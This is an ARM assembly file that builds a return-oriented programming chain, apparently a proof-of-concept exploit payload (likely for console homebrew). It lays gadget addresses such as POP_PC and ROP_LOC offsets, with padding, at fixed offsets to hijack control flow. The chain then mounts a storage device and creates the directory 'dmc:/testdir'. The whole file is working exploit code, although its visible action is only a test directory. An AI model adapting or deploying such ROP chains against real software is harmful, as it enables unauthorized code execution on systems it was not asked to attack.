	.arm
	.text

#include "rop.h"

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_fs_mount(DMC)
	rop_dir_create(dir)

.org 0x0F4, GARBAGE
@	.fill 3, 4, GARBAGE
	.word ROP_LOC+_start+0x8C
.org 0x128, GARBAGE
@	.fill 12, 4, GARBAGE
	.word ROP_LOC+_start, 0, POP_PC
.org 0x158, GARBAGE
@	.fill 9, 4, GARBAGE
	.fill 2, 4, POP_PC
dir:
	.string16 "dmc:/testdir"
.org 0x21C, GARBAGE
@	.fill 44, 4, GARBAGE
	.word MAGIC
